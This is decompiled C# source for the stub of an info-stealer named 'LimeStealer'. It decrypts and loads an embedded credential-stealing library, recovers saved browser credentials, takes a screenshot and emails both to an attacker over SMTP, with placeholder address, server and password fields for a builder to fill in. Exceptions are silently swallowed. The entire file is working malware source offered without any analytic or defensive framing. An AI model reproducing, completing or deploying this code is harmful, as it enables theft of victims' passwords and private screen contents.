using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Stub.Properties;

namespace Stub
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private static void Main()
		{
			Assembly assembly = Assembly.Load(Program.AES_Decryptor(Resources.StealerLib));
			MethodInfo method = assembly.GetType("StealerLib.Browsers.CaptureBrowsers").GetMethod("RecoverCredential");
			object obj = assembly.CreateInstance(method.Name);
			Program.Send((string)method.Invoke(obj, null));
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020A0 File Offset: 0x000002A0
		private static byte[] AES_Decryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes("00110011"));
			rijndaelManaged.Mode = CipherMode.ECB;
			return rijndaelManaged.CreateDecryptor().TransformFinalBlock(input, 0, input.Length);
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020EC File Offset: 0x000002EC
		private static void Send(string data)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				SmtpClient smtpClient = new SmtpClient();
				mailMessage.From = new MailAddress("%EMAIL%");
				mailMessage.To.Add(new MailAddress("%EMAIL%"));
				mailMessage.Subject = string.Format("LimeStealer | {0} | {1} UTC", Environment.UserName, DateTime.UtcNow);
				ContentType contentType = new ContentType();
				contentType.MediaType = "image/jpeg";
				contentType.Name = "Screenshot.jpg";
				Attachment item = new Attachment(new MemoryStream(Program.Screenshot()), contentType);
				mailMessage.Attachments.Add(item);
				mailMessage.IsBodyHtml = false;
				mailMessage.Body = data;
				smtpClient.Port = 587;
				smtpClient.Host = "%SMTP%";
				smtpClient.EnableSsl = true;
				smtpClient.UseDefaultCredentials = false;
				smtpClient.Credentials = new NetworkCredential("%EMAIL%", "%PASS%");
				smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
				smtpClient.Send(mailMessage);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021EC File Offset: 0x000003EC
		private static byte[] Screenshot()
		{
			Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			byte[] result;
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
					Bitmap bitmap2 = bitmap;
					bitmap2.Save(memoryStream, ImageFormat.Jpeg);
					bitmap2.Dispose();
					result = memoryStream.ToArray();
				}
			}
			return result;
		}
	}
}
